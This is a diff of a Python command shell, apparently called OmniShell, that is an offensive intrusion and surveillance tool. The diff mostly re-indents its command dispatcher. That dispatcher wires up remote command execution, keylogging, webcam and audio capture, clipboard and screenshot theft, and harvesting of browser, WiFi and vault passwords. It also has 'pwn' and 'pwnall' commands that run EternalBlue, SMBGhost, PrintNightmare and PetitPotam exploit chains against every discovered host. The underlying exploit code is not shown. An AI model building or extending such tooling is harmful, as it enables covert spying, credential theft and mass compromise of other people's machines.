@@ -1332,439 +1332,434 @@ class OmniShell:
                         gw = self.discovery.get_gateway_ip() if hasattr(self.discovery, 'get_gateway_ip') else 'N/A'
                         print(f"Gateway: {gw}")
 
-            elif cmd == "external-ip":
-                if self.discovery:
-                    ext = self.discovery._detect_external_info() if hasattr(self.discovery, '_detect_external_info') else {}
-                    print(f"External IP: {ext.get('external_ip', 'N/A')}")
+                elif cmd == "external-ip":
+                    if self.discovery:
+                        ext = self.discovery._detect_external_info() if hasattr(self.discovery, '_detect_external_info') else {}
+                        print(f"External IP: {ext.get('external_ip', 'N/A')}")
 
-            elif cmd == "cloud-scan":
-                provider = args[0] if args else 'aws'
-                if self.adv_scan:
-                    devices = self.adv_scan.scan_public_ranges(provider) if hasattr(self.adv_scan, 'scan_public_ranges') else []
-                    print(f"[+] Found {len(devices)} devices in {provider} ranges")
+                elif cmd == "cloud-scan":
+                    provider = args[0] if args else 'aws'
+                    if self.adv_scan:
+                        devices = self.adv_scan.scan_public_ranges(provider) if hasattr(self.adv_scan, 'scan_public_ranges') else []
+                        print(f"[+] Found {len(devices)} devices in {provider} ranges")
 
-            elif cmd == "scan" and args:
-                if self.discovery:
-                    self.hosts = self.discovery.full_scan(args[0]) if hasattr(self.discovery, 'full_scan') else []
-                    self._show_hosts_table()
+                elif cmd == "scan" and args:
+                    if self.discovery:
+                        self.hosts = self.discovery.full_scan(args[0]) if hasattr(self.discovery, 'full_scan') else []
+                        self._show_hosts_table()
 
-            elif cmd == "arp" and args:
-                if self.discovery:
-                    hosts = self.discovery.arp_scan(args[0]) if hasattr(self.discovery, 'arp_scan') else []
-                    print(f"[+] Found {len(hosts)} hosts")
+                elif cmd == "arp" and args:
+                    if self.discovery:
+                        hosts = self.discovery.arp_scan(args[0]) if hasattr(self.discovery, 'arp_scan') else []
+                        print(f"[+] Found {len(hosts)} hosts")
 
-            elif cmd == "icmp" and args:
-                if self.discovery:
-                    hosts = self.discovery.icmp_sweep(args[0]) if hasattr(self.discovery, 'icmp_sweep') else []
-                    print(f"[+] Found {len(hosts)} hosts")
+                elif cmd == "icmp" and args:
+                    if self.discovery:
+                        hosts = self.discovery.icmp_sweep(args[0]) if hasattr(self.discovery, 'icmp_sweep') else []
+                        print(f"[+] Found {len(hosts)} hosts")
 
-            elif cmd == "netbios" and args:
-                if self.discovery:
-                    info = self.discovery.netbios_scan(args[0]) if hasattr(self.discovery, 'netbios_scan') else {}
-                    print(f"[+] {json.dumps(info, indent=2)}")
+                elif cmd == "netbios" and args:
+                    if self.discovery:
+                        info = self.discovery.netbios_scan(args[0]) if hasattr(self.discovery, 'netbios_scan') else {}
+                        print(f"[+] {json.dumps(info, indent=2)}")
 
-            elif cmd == "mdns":
-                if self.discovery:
-                    devices = self.discovery.mdns_listen() if hasattr(self.discovery, 'mdns_listen') else []
-                    print(f"[+] Found {len(devices)} devices")
+                elif cmd == "mdns":
+                    if self.discovery:
+                        devices = self.discovery.mdns_listen() if hasattr(self.discovery, 'mdns_listen') else []
+                        print(f"[+] Found {len(devices)} devices")
 
-            elif cmd == "ssdp":
-                if self.discovery:
-                    devices = self.discovery.ssdp_discover() if hasattr(self.discovery, 'ssdp_discover') else []
-                    print(f"[+] Found {len(devices)} devices")
+                elif cmd == "ssdp":
+                    if self.discovery:
+                        devices = self.discovery.ssdp_discover() if hasattr(self.discovery, 'ssdp_discover') else []
+                        print(f"[+] Found {len(devices)} UPnP devices")
 
-            elif cmd == "snmp" and args:
-                if self.discovery:
-                    info = self.discovery.snmp_query(args[0]) if hasattr(self.discovery, 'snmp_query') else {}
-                    print(f"[+] {json.dumps(info, indent=2)}")
+                elif cmd == "snmp" and args:
+                    if self.discovery:
+                        info = self.discovery.snmp_query(args[0]) if hasattr(self.discovery, 'snmp_query') else {}
+                        print(f"[+] {json.dumps(info, indent=2)}")
 
-            elif cmd == "http" and args:
-                if self.discovery:
-                    info = self.discovery.http_fingerprint(args[0]) if hasattr(self.discovery, 'http_fingerprint') else {}
-                    print(f"[+] {json.dumps(info, indent=2)}")
+                elif cmd == "http" and args:
+                    if self.discovery:
+                        info = self.discovery.http_fingerprint(args[0]) if hasattr(self.discovery, 'http_fingerprint') else {}
+                        print(f"[+] {json.dumps(info, indent=2)}")
 
-            elif cmd == "traceroute" and args:
-                if self.adv_scan:
-                    hops = self.adv_scan.traceroute(args[0]) if hasattr(self.adv_scan, 'traceroute') else []
-                    print(f"[+] {len(hops)} hops to {args[0]}")
+                elif cmd == "traceroute" and args:
+                    if self.adv_scan:
+                        hops = self.adv_scan.traceroute(args[0]) if hasattr(self.adv_scan, 'traceroute') else []
+                        print(f"[+] {len(hops)} hops to {args[0]}")
 
-            elif cmd == "topology":
-                if self.adv_scan:
-                    topo = self.adv_scan.get_topology_map() if hasattr(self.adv_scan, 'get_topology_map') else {}
-                    print(f"{json.dumps(topo, indent=2)}")
+                elif cmd == "topology":
+                    if self.adv_scan:
+                        topo = self.adv_scan.get_topology_map() if hasattr(self.adv_scan, 'get_topology_map') else {}
+                        print(f"{json.dumps(topo, indent=2)}")
 
-            elif cmd == "network":
-                if self.discovery:
-                    info = self.discovery.get_network_info() if hasattr(self.discovery, 'get_network_info') else {}
-                    print(f"{json.dumps(info, indent=2)}")
+                elif cmd == "network":
+                    if self.discovery:
+                        info = self.discovery.get_network_info() if hasattr(self.discovery, 'get_network_info') else {}
+                        print(f"{json.dumps(info, indent=2)}")
 
-            elif cmd == "interfaces":
-                if self.discovery:
-                    info = self.discovery.get_interface_info() if hasattr(self.discovery, 'get_interface_info') else {}
-                    print(f"{json.dumps(info, indent=2)}")
+                elif cmd == "interfaces":
+                    if self.discovery:
+                        info = self.discovery.get_interface_info() if hasattr(self.discovery, 'get_interface_info') else {}
+                        print(f"{json.dumps(info, indent=2)}")
 
-            elif cmd == "gateway":
-                if self.discovery:
-                    gw = self.discovery.get_gateway_ip() if hasattr(self.discovery, 'get_gateway_ip') else 'N/A'
-                    print(f"Gateway: {gw}")
+                elif cmd == "gateway":
+                    if self.discovery:
+                        gw = self.discovery.get_gateway_ip() if hasattr(self.discovery, 'get_gateway_ip') else 'N/A'
+                        print(f"Gateway: {gw}")
 
-            elif cmd == "external-ip":
-                if self.discovery:
-                    ext = self.discovery._detect_external_info() if hasattr(self.discovery, '_detect_external_info') else {}
-                    print(f"External IP: {ext.get('external_ip', 'N/A')}")
+                elif cmd == "external-ip":
+                    if self.discovery:
+                        ext = self.discovery._detect_external_info() if hasattr(self.discovery, '_detect_external_info') else {}
+                        print(f"External IP: {ext.get('external_ip', 'N/A')}")
 
-            elif cmd == "setdomain":
-                if args:
-                    self.credentials["domain"] = args[0]
-                    print(f"[+] Domain set to: {args[0]}")
-                else:
-                    print(f"Current domain: {self.credentials['domain'] or 'NONE'}")
+                elif cmd == "setdomain":
+                    if args:
+                        self.credentials["domain"] = args[0]
+                        print(f"[+] Domain set to: {args[0]}")
+                    else:
+                        print(f"Current domain: {self.credentials['domain'] or 'NONE'}")
 
-            elif cmd == "processes":
-                target = args[0] if args else self.selected_target
-                if not target:
-                    print(f"{Fore.RED}[!] No target selected.")
-                    return
-                if self.control and hasattr(self.control, 'list_processes'):
-                    procs = self.control.list_processes(target, self.credentials["user"], self.credentials["pass"])
-                    Visualizer.table(["PID", "NAME", "MEM"], [[p.get('ProcessId','?'), p.get('Name','?'), p.get('WorkingSetSize','0')] for p in procs[:20]], "PROCESSES")
+                elif cmd == "processes":
+                    target = args[0] if args else self.selected_target
+                    if not target:
+                        print(f"{Fore.RED}[!] No target selected.")
+                        return
+                    if self.control and hasattr(self.control, 'list_processes'):
+                        procs = self.control.list_processes(target, self.credentials["user"], self.credentials["pass"])
+                        Visualizer.table(["PID", "NAME", "MEM"], [[p.get('ProcessId','?'), p.get('Name','?'), p.get('WorkingSetSize','0')] for p in procs[:20]], "PROCESSES")
 
-            # ==================== INTELLIGENCE ====================
-            elif cmd == "sniff":
-                if self.intel:
-                    iface = args[0] if args else None
-                    self.intel.start_sniffing(iface=iface)
-                    print(f"[+] Sniffer active")
+                # ==================== INTELLIGENCE ====================
+                elif cmd == "sniff":
+                    if self.intel:
+                        iface = args[0] if args else None
+                        self.intel.start_sniffing(iface=iface)
+                        print(f"[+] Sniffer active")
 
-            elif cmd == "stopsniff":
-                if self.intel:
-                    self.intel.stop_sniffing()
-                    print(f"[*] Sniffer stopped")
+                elif cmd == "stopsniff":
+                    if self.intel:
+                        self.intel.stop_sniffing()
+                        print(f"[*] Sniffer stopped")
 
-            elif cmd == "setdomain":
-                if args:
-                    self.credentials["domain"] = args[0]
-                    print(f"[+] Domain set to: {args[0]}")
-                else:
-                    print(f"Current domain: {self.credentials['domain'] or 'NONE'}")
 
-            elif cmd == "creds":
-                if self.intel:
-                    creds = self.intel.get_credentials() if hasattr(self.intel, 'get_credentials') else []
-                    Visualizer.table(["TIME", "SOURCE", "DATA"], 
-                        [[c.get('time','?'), c.get('src','?'), str(c.get('data','?'))[:40]] for c in creds[:20]],
-                        "CREDENTIALS")
 
-            elif cmd == "dns-log":
-                if self.intel:
-                    logs = self.intel.get_dns_log() if hasattr(self.intel, 'get_dns_log') else []
-                    Visualizer.table(["TIME", "QUERY"], [[l.get('time','?'), l.get('query','?')] for l in logs[:20]], "DNS")
+                elif cmd == "creds":
+                    if self.intel:
+                        creds = self.intel.get_credentials() if hasattr(self.intel, 'get_credentials') else []
+                        Visualizer.table(["TIME", "SOURCE", "DATA"], 
+                            [[c.get('time','?'), c.get('src','?'), str(c.get('data','?'))[:40]] for c in creds[:20]],
+                            "CREDENTIALS")
 
-            elif cmd == "monitor":
-                target = args[0] if args else self.selected_target
-                if not target:
-                    print(f"{Fore.RED}[!] No target selected.")
-                    return
-                if self.intel:
-                    self.intel.wmi_monitor_activity(target, self.credentials["user"], self.credentials["pass"])
-                    print(f"[+] Monitoring {target}")
+                elif cmd == "dns-log":
+                    if self.intel:
+                        logs = self.intel.get_dns_log() if hasattr(self.intel, 'get_dns_log') else []
+                        Visualizer.table(["TIME", "QUERY"], [[l.get('time','?'), l.get('query','?')] for l in logs[:20]], "DNS")
 
-            elif cmd == "wmi-proc":
-                target = args[0] if args else self.selected_target
-                if not target:
-                    print(f"{Fore.RED}[!] No target selected.")
-                    return
-                if self.intel and hasattr(self.intel, 'wmi_processes'):
-                    procs = self.intel.wmi_processes(target, self.credentials["user"], self.credentials["pass"])
-                    Visualizer.table(["PID", "NAME"], [[p.get('ProcessId','?'), p.get('Name','?')] for p in procs[:20]], "PROCESSES")
+                elif cmd == "monitor":
+                    target = args[0] if args else self.selected_target
+                    if not target:
+                        print(f"{Fore.RED}[!] No target selected.")
+                        return
+                    if self.intel:
+                        self.intel.wmi_monitor_activity(target, self.credentials["user"], self.credentials["pass"])
+                        print(f"[+] Monitoring {target}")
 
-            elif cmd == "wmi-users":
-                target = args[0] if args else self.selected_target
-                if not target:
-                    print(f"{Fore.RED}[!] No target selected.")
-                    return
-                if self.intel and hasattr(self.intel, 'wmi_logged_users'):
-                    users = self.intel.wmi_logged_users(target, self.credentials["user"], self.credentials["pass"])
-                    print(f"{json.dumps(users, indent=2)}")
+                elif cmd == "wmi-proc":
+                    target = args[0] if args else self.selected_target
+                    if not target:
+                        print(f"{Fore.RED}[!] No target selected.")
+                        return
+                    if self.intel and hasattr(self.intel, 'wmi_processes'):
+                        procs = self.intel.wmi_processes(target, self.credentials["user"], self.credentials["pass"])
+                        Visualizer.table(["PID", "NAME"], [[p.get('ProcessId','?'), p.get('Name','?')] for p in procs[:20]], "PROCESSES")
 
-            # ==================== CONTROL ====================
-            elif cmd == "exec" and len(args) >= 1:
-                target = self.selected_target
-                cmd_to_run = " ".join(args)
-                if args[0].count('.') >= 3: # Primitive IP check
-                    target = args[0]
-                    cmd_to_run = " ".join(args[1:])
-                
-                if not target:
-                    print(f"{Fore.RED}[!] No target selected.")
-                    return
+                elif cmd == "wmi-users":
+                    target = args[0] if args else self.selected_target
+                    if not target:
+                        print(f"{Fore.RED}[!] No target selected.")
+                        return
+                    if self.intel and hasattr(self.intel, 'wmi_logged_users'):
+                        users = self.intel.wmi_logged_users(target, self.credentials["user"], self.credentials["pass"])
+                        print(f"{json.dumps(users, indent=2)}")
+
+                # ==================== CONTROL ====================
+                elif cmd == "exec" and len(args) >= 1:
+                    target = self.selected_target
+                    cmd_to_run = " ".join(args)
+                    if args[0].count('.') >= 3: # Primitive IP check
+                        target = args[0]
+                        cmd_to_run = " ".join(args[1:])
                     
-                if self.control and hasattr(self.control, 'wmi_exec'):
-                    HackerSounds.network_pulse()
-                    res = self.control.wmi_exec(target, self.credentials["user"], self.credentials["pass"], cmd_to_run)
-                    print(f"\n{Fore.GREEN}╔════════════════════════════════════════════════════════════╗")
-                    print(f"{Fore.GREEN}║  COMMAND EXECUTION RESULTS")
-                    print(f"{Fore.GREEN}╠════════════════════════════════════════════════════════════╣")
-                    print(f"{Fore.LIGHTGREEN_EX}{res.get('output', 'No output')}")
-                    print(f"{Fore.GREEN}╚════════════════════════════════════════════════════════════╝\n")
-                    HackerSounds.success()
+                    if not target:
+                        print(f"{Fore.RED}[!] No target selected.")
+                        return
+                        
+                    if self.control and hasattr(self.control, 'wmi_exec'):
+                        HackerSounds.network_pulse()
+                        res = self.control.wmi_exec(target, self.credentials["user"], self.credentials["pass"], cmd_to_run)
+                        print(f"\n{Fore.GREEN}╔════════════════════════════════════════════════════════════╗")
+                        print(f"{Fore.GREEN}║  COMMAND EXECUTION RESULTS")
+                        print(f"{Fore.GREEN}╠════════════════════════════════════════════════════════════╣")
+                        print(f"{Fore.LIGHTGREEN_EX}{res.get('output', 'No output')}")
+                        print(f"{Fore.GREEN}╚════════════════════════════════════════════════════════════╝\n")
+                        HackerSounds.success()
 
-            elif cmd == "ssh-exec" and len(args) >= 1:
-                target = self.selected_target
-                cmd_to_run = " ".join(args)
-                if args[0].count('.') >= 3:
-                    target = args[0]
-                    cmd_to_run = " ".join(args[1:])
-                    
-                if not target:
-                    print(f"{Fore.RED}[!] No target selected.")
-                    return
-                    
-                if self.control and hasattr(self.control, 'ssh_exec'):
-                    res = self.control.ssh_exec(target, self.credentials["user"], self.credentials["pass"], cmd_to_run)
-                    print(f"{res}")
-
-            elif cmd == "screen":
-                target = args[0] if args else self.selected_target
-                if not target:
-                    print(f"{Fore.RED}[!] No target selected.")
-                    return
-                if self.control and hasattr(self.control, 'wmi_screenshot'):
-                    path = self.control.wmi_screenshot(target, self.credentials["user"], self.credentials["pass"])
-                    print(f"[+] Screenshot: {path}")
-                    Visualizer.display_screenshot(path)
-
-            elif cmd == "webcam":
-                target = args[0] if args else self.selected_target
-                if not target:
-                    print(f"{Fore.RED}[!] No target selected.")
-                    return
-                if self.control and hasattr(self.control, 'take_webcam_snapshot'):
-                    path = self.control.take_webcam_snapshot(target, self.credentials["user"], self.credentials["pass"])
-                    print(f"[+] Webcam: {path}")
-
-            elif cmd == "audio":
-                target = self.selected_target
-                dur = 10
-                if args:
+                elif cmd == "ssh-exec" and len(args) >= 1:
+                    target = self.selected_target
+                    cmd_to_run = " ".join(args)
                     if args[0].count('.') >= 3:
                         target = args[0]
-                        dur = int(args[1]) if len(args) > 1 else 10
+                        cmd_to_run = " ".join(args[1:])
+                        
+                    if not target:
+                        print(f"{Fore.RED}[!] No target selected.")
+                        return
+                        
+                    if self.control and hasattr(self.control, 'ssh_exec'):
+                        res = self.control.ssh_exec(target, self.credentials["user"], self.credentials["pass"], cmd_to_run)
+                        print(f"{res}")
+
+                elif cmd == "screen":
+                    target = args[0] if args else self.selected_target
+                    if not target:
+                        print(f"{Fore.RED}[!] No target selected.")
+                        return
+                    if self.control and hasattr(self.control, 'wmi_screenshot'):
+                        path = self.control.wmi_screenshot(target, self.credentials["user"], self.credentials["pass"])
+                        print(f"[+] Screenshot: {path}")
+                        Visualizer.display_screenshot(path)
+
+                elif cmd == "webcam":
+                    target = args[0] if args else self.selected_target
+                    if not target:
+                        print(f"{Fore.RED}[!] No target selected.")
+                        return
+                    if self.control and hasattr(self.control, 'take_webcam_snapshot'):
+                        path = self.control.take_webcam_snapshot(target, self.credentials["user"], self.credentials["pass"])
+                        print(f"[+] Webcam: {path}")
+
+                elif cmd == "audio":
+                    target = self.selected_target
+                    dur = 10
+                    if args:
+                        if args[0].count('.') >= 3:
+                            target = args[0]
+                            dur = int(args[1]) if len(args) > 1 else 10
+                        else:
+                            dur = int(args[0])
+                            
+                    if not target:
+                        print(f"{Fore.RED}[!] No target selected.")
+                        return
+                        
+                    if self.control and hasattr(self.control, 'wmi_capture_audio'):
+                        path = self.control.wmi_capture_audio(target, self.credentials["user"], self.credentials["pass"], duration=dur)
+                        print(f"[+] Audio: {path}")
+
+                elif cmd == "keylog":
+                    target = args[0] if args else self.selected_target
+                    if not target:
+                        print(f"{Fore.RED}[!] No target selected.")
+                        return
+                    if self.control and hasattr(self.control, 'wmi_keylogger_start'):
+                        self.control.wmi_keylogger_start(target, self.credentials["user"], self.credentials["pass"])
+                        print(f"[+] Keylogger started on {target}")
+
+                elif cmd == "clipboard-get":
+                    target = args[0] if args else self.selected_target
+                    if not target:
+                        print(f"{Fore.RED}[!] No target selected.")
+                        return
+                    if self.control and hasattr(self.control, 'get_clipboard'):
+                        clip = self.control.get_clipboard(target, self.credentials["user"], self.credentials["pass"])
+                        print(f"Clipboard: {clip}")
+
+                elif cmd == "clipboard-set" and len(args) >= 1:
+                    target = self.selected_target
+                    txt = " ".join(args)
+                    if args[0].count('.') >= 3:
+                        target = args[0]
+                        txt = " ".join(args[1:])
+                        
+                    if not target:
+                        print(f"{Fore.RED}[!] No target selected.")
+                        return
+                        
+                    if self.control and hasattr(self.control, 'set_clipboard'):
+                        self.control.set_clipboard(target, self.credentials["user"], self.credentials["pass"], txt)
+                        print(f"[+] Clipboard set")
+
+                elif cmd == "pslist":
+                    target = args[0] if args else self.selected_target
+                    if not target:
+                        print(f"{Fore.RED}[!] No target selected.")
+                        return
+                    if self.control and hasattr(self.control, 'list_processes'):
+                        procs = self.control.list_processes(target, self.credentials["user"], self.credentials["pass"])
+                        Visualizer.table(["PID", "NAME"], [[p.get('ProcessId','?'), p.get('Name','?')] for p in procs[:20]], "PROCESSES")
+
+                elif cmd == "killproc" and len(args) >= 1:
+                    target = self.selected_target
+                    pid = int(args[0])
+                    if args[0].count('.') >= 3:
+                        target = args[0]
+                        pid = int(args[1]) if len(args) > 1 else 0
+                        
+                    if not target or not pid:
+                        print(f"{Fore.RED}[!] Usage: killproc [ip] <pid>")
+                        return
+                        
+                    if self.control and hasattr(self.control, 'kill_process'):
+                        self.control.kill_process(target, self.credentials["user"], self.credentials["pass"], pid=pid)
+                        print(f"[+] Process {pid} killed on {target}")
+
+                elif cmd == "svc-list":
+                    target = args[0] if args else self.selected_target
+                    if not target:
+                        print(f"{Fore.RED}[!] No target selected.")
+                        return
+                    if self.control and hasattr(self.control, 'list_services'):
+                        svcs = self.control.list_services(target, self.credentials["user"], self.credentials["pass"])
+                        Visualizer.table(["NAME", "STATUS"], [[s.get('Name','?'), s.get('Status','?')] for s in svcs[:20]], "SERVICES")
+
+                elif cmd == "vault":
+                    target = args[0] if args else self.selected_target
+                    if not target:
+                        print(f"{Fore.RED}[!] No target selected.")
+                        return
+                    if self.control and hasattr(self.control, 'wmi_harvest_vault'):
+                        data = self.control.wmi_harvest_vault(target, self.credentials["user"], self.credentials["pass"])
+                        print(f"{json.dumps(data, indent=2)}")
+
+                # ==================== EXPLOIT ====================
+                elif cmd == "omnifetch":
+                    target = args[0] if args else self.selected_target
+                    if not target:
+                        print(f"{Fore.RED}[!] No target specified. Use 'select <idx>' or 'omnifetch <ip>'.")
+                        return
+                    print(f"[*] OmniFetch for {target}...")
+                    if self.universal:
+                        self.universal.pwn_target(target)
+                    if self.control and hasattr(self.control, 'get_browser_data'):
+                        data = self.control.get_browser_data(target, self.credentials["user"], self.credentials["pass"])
+                        print(f"[+] {json.dumps(data, indent=2)}")
+
+                elif cmd == "stealcreds":
+                    target = args[0] if args else self.selected_target
+                    if not target:
+                        print(f"{Fore.RED}[!] No target specified. Use 'select <idx>' or 'stealcreds <ip>'.")
+                        return
+                    if self.control:
+                        pw = self.control.get_browser_passwords(target, self.credentials["user"], self.credentials["pass"]) if hasattr(self.control, 'get_browser_passwords') else {}
+                        wifi = self.control.get_wifi_passwords(target, self.credentials["user"], self.credentials["pass"]) if hasattr(self.control, 'get_wifi_passwords') else {}
+                        print(f"[+] Passwords: {json.dumps(pw, indent=2)}")
+                        print(f"[+] WiFi: {json.dumps(wifi, indent=2)}")
+            
+                elif cmd in ("pwn", "exploit") and args:
+                    target = args[0]
+                    HackerSounds.alert()
+                    self._log(f"\n{Fore.GREEN}╔════════════════════════════════════════════════════════════╗")
+                    self._log(f"{Fore.GREEN}║  EXPLOITING TARGET: {target}")
+                    self._log(f"{Fore.GREEN}╠════════════════════════════════════════════════════════════╣")
+                    
+                    success = False
+                    exploits = []
+                    
+                    if self.universal:
+                        device = self.universal.devices.get(target)
+                        if device:
+                            self.universal._scan_device(device)
+                            if device.can_pwn:
+                                success = True
+                                exploits = device.is_vulnerable
+                    
+                    if self.control:
+                        # Try all exploit chains
+                        chains = ["eternal_blue", "smbghost", "printnightmare", "petitpotam", "winrm"]
+                        for chain in chains:
+                            try:
+                                if hasattr(self.control, chain):
+                                    res = getattr(self.control, chain)(target, self.credentials["user"], self.credentials["pass"])
+                                    if res.get('success'):
+                                        success = True
+                                        exploits.append(chain)
+                            except:
+                                pass
+                    
+                    if success:
+                        HackerSounds.exploit_success()
+                        self._log(f"{Fore.LIGHTGREEN_EX}  ✅ EXPLOIT SUCCESSFUL")
+                        self._log(f"{Fore.LIGHTGREEN_EX}  ✅ ACCESS GRANTED TO {target}")
+                        self._log(f"{Fore.LIGHTGREEN_EX}  ✅ Vulnerabilities: {', '.join(exploits)}")
                     else:
-                        dur = int(args[0])
-                        
-                if not target:
-                    print(f"{Fore.RED}[!] No target selected.")
-                    return
+                        self._log(f"{Fore.RED}  ❌ Exploit failed")
                     
-                if self.control and hasattr(self.control, 'wmi_capture_audio'):
-                    path = self.control.wmi_capture_audio(target, self.credentials["user"], self.credentials["pass"], duration=dur)
-                    print(f"[+] Audio: {path}")
-
-            elif cmd == "keylog":
-                target = args[0] if args else self.selected_target
-                if not target:
-                    print(f"{Fore.RED}[!] No target selected.")
-                    return
-                if self.control and hasattr(self.control, 'wmi_keylogger_start'):
-                    self.control.wmi_keylogger_start(target, self.credentials["user"], self.credentials["pass"])
-                    print(f"[+] Keylogger started on {target}")
-
-            elif cmd == "clipboard-get":
-                target = args[0] if args else self.selected_target
-                if not target:
-                    print(f"{Fore.RED}[!] No target selected.")
-                    return
-                if self.control and hasattr(self.control, 'get_clipboard'):
-                    clip = self.control.get_clipboard(target, self.credentials["user"], self.credentials["pass"])
-                    print(f"Clipboard: {clip}")
-
-            elif cmd == "clipboard-set" and len(args) >= 1:
-                target = self.selected_target
-                txt = " ".join(args)
-                if args[0].count('.') >= 3:
-                    target = args[0]
-                    txt = " ".join(args[1:])
-                    
-                if not target:
-                    print(f"{Fore.RED}[!] No target selected.")
-                    return
-                    
-                if self.control and hasattr(self.control, 'set_clipboard'):
-                    self.control.set_clipboard(target, self.credentials["user"], self.credentials["pass"], txt)
-                    print(f"[+] Clipboard set")
-
-            elif cmd == "pslist":
-                target = args[0] if args else self.selected_target
-                if not target:
-                    print(f"{Fore.RED}[!] No target selected.")
-                    return
-                if self.control and hasattr(self.control, 'list_processes'):
-                    procs = self.control.list_processes(target, self.credentials["user"], self.credentials["pass"])
-                    Visualizer.table(["PID", "NAME"], [[p.get('ProcessId','?'), p.get('Name','?')] for p in procs[:20]], "PROCESSES")
-
-            elif cmd == "killproc" and len(args) >= 1:
-                target = self.selected_target
-                pid = int(args[0])
-                if args[0].count('.') >= 3:
-                    target = args[0]
-                    pid = int(args[1]) if len(args) > 1 else 0
-                    
-                if not target or not pid:
-                    print(f"{Fore.RED}[!] Usage: killproc [ip] <pid>")
-                    return
-                    
-                if self.control and hasattr(self.control, 'kill_process'):
-                    self.control.kill_process(target, self.credentials["user"], self.credentials["pass"], pid=pid)
-                    print(f"[+] Process {pid} killed on {target}")
-
-            elif cmd == "svc-list":
-                target = args[0] if args else self.selected_target
-                if not target:
-                    print(f"{Fore.RED}[!] No target selected.")
-                    return
-                if self.control and hasattr(self.control, 'list_services'):
-                    svcs = self.control.list_services(target, self.credentials["user"], self.credentials["pass"])
-                    Visualizer.table(["NAME", "STATUS"], [[s.get('Name','?'), s.get('Status','?')] for s in svcs[:20]], "SERVICES")
-
-            elif cmd == "vault":
-                target = args[0] if args else self.selected_target
-                if not target:
-                    print(f"{Fore.RED}[!] No target selected.")
-                    return
-                if self.control and hasattr(self.control, 'wmi_harvest_vault'):
-                    data = self.control.wmi_harvest_vault(target, self.credentials["user"], self.credentials["pass"])
-                    print(f"{json.dumps(data, indent=2)}")
-
-            # ==================== EXPLOIT ====================
-            elif cmd == "omnifetch":
-                target = args[0] if args else self.selected_target
-                if not target:
-                    print(f"{Fore.RED}[!] No target specified. Use 'select <idx>' or 'omnifetch <ip>'.")
-                    return
-                print(f"[*] OmniFetch for {target}...")
-                if self.universal:
-                    self.universal.pwn_target(target)
-                if self.control and hasattr(self.control, 'get_browser_data'):
-                    data = self.control.get_browser_data(target, self.credentials["user"], self.credentials["pass"])
-                    print(f"[+] {json.dumps(data, indent=2)}")
-
-            elif cmd == "stealcreds":
-                target = args[0] if args else self.selected_target
-                if not target:
-                    print(f"{Fore.RED}[!] No target specified. Use 'select <idx>' or 'stealcreds <ip>'.")
-                    return
-                if self.control:
-                    pw = self.control.get_browser_passwords(target, self.credentials["user"], self.credentials["pass"]) if hasattr(self.control, 'get_browser_passwords') else {}
-                    wifi = self.control.get_wifi_passwords(target, self.credentials["user"], self.credentials["pass"]) if hasattr(self.control, 'get_wifi_passwords') else {}
-                    print(f"[+] Passwords: {json.dumps(pw, indent=2)}")
-                    print(f"[+] WiFi: {json.dumps(wifi, indent=2)}")
+                    self._log(f"{Fore.GREEN}╚════════════════════════════════════════════════════════════╝\n")
             
-            elif cmd in ("pwn", "exploit") and args:
-                target = args[0]
-                HackerSounds.alert()
-                self._log(f"\n{Fore.GREEN}╔════════════════════════════════════════════════════════════╗")
-                self._log(f"{Fore.GREEN}║  EXPLOITING TARGET: {target}")
-                self._log(f"{Fore.GREEN}╠════════════════════════════════════════════════════════════╣")
-                
-                success = False
-                exploits = []
-                
-                if self.universal:
-                    device = self.universal.devices.get(target)
-                    if device:
-                        self.universal._scan_device(device)
-                        if device.can_pwn:
-                            success = True
-                            exploits = device.is_vulnerable
-                
-                if self.control:
-                    # Try all exploit chains
-                    chains = ["eternal_blue", "smbghost", "printnightmare", "petitpotam", "winrm"]
-                    for chain in chains:
+                elif cmd in ("attack", "pwnall"):
+                    HackerSounds.alert()
+                    MatrixEffects.target_lock()
+                    self._log(f"\n{Fore.GREEN}╔════════════════════════════════════════════════════════════╗")
+                    self._log(f"{Fore.GREEN}║  GLOBAL NETWORK ASSAULT INITIATED")
+                    self._log(f"{Fore.GREEN}╠════════════════════════════════════════════════════════════╣")
+                    
+                    total = len(self.hosts)
+                    compromised = 0
+                    
+                    for i, host in enumerate(self.hosts):
                         try:
-                            if hasattr(self.control, chain):
-                                res = getattr(self.control, chain)(target, self.credentials["user"], self.credentials["pass"])
-                                if res.get('success'):
-                                    success = True
-                                    exploits.append(chain)
-                        except:
-                            pass
-                
-                if success:
+                            ip = host.get('ip') if isinstance(host, dict) else getattr(host, 'ip', str(host))
+                            self._log(f"{Fore.LIGHTGREEN_EX}  ⟶ [{i+1}/{total}] Targeting {ip}...")
+                            
+                            if self.universal:
+                                device = self.universal.devices.get(ip)
+                                if device:
+                                    self.universal._scan_device(device)
+                                    if device.can_pwn:
+                                        compromised += 1
+                                        self._log(f"{Fore.GREEN}    ✅ COMPROMISED: {ip}")
+                            
+                        except Exception as e:
+                            self._log(f"{Fore.RED}    ❌ Failed: {str(e)[:30]}")
+                    
                     HackerSounds.exploit_success()
-                    self._log(f"{Fore.LIGHTGREEN_EX}  ✅ EXPLOIT SUCCESSFUL")
-                    self._log(f"{Fore.LIGHTGREEN_EX}  ✅ ACCESS GRANTED TO {target}")
-                    self._log(f"{Fore.LIGHTGREEN_EX}  ✅ Vulnerabilities: {', '.join(exploits)}")
-                else:
-                    self._log(f"{Fore.RED}  ❌ Exploit failed")
-                
-                self._log(f"{Fore.GREEN}╚════════════════════════════════════════════════════════════╝\n")
-            
-            elif cmd in ("attack", "pwnall"):
-                HackerSounds.alert()
-                MatrixEffects.target_lock()
-                self._log(f"\n{Fore.GREEN}╔════════════════════════════════════════════════════════════╗")
-                self._log(f"{Fore.GREEN}║  GLOBAL NETWORK ASSAULT INITIATED")
-                self._log(f"{Fore.GREEN}╠════════════════════════════════════════════════════════════╣")
-                
-                total = len(self.hosts)
-                compromised = 0
-                
-                for i, host in enumerate(self.hosts):
-                    try:
-                        ip = host.get('ip') if isinstance(host, dict) else getattr(host, 'ip', str(host))
-                        self._log(f"{Fore.LIGHTGREEN_EX}  ⟶ [{i+1}/{total}] Targeting {ip}...")
-                        
-                        if self.universal:
-                            device = self.universal.devices.get(ip)
-                            if device:
-                                self.universal._scan_device(device)
-                                if device.can_pwn:
-                                    compromised += 1
-                                    self._log(f"{Fore.GREEN}    ✅ COMPROMISED: {ip}")
-                        
-                    except Exception as e:
-                        self._log(f"{Fore.RED}    ❌ Failed: {str(e)[:30]}")
-                
-                HackerSounds.exploit_success()
-                self._log(f"\n{Fore.GREEN}╠════════════════════════════════════════════════════════════╣")
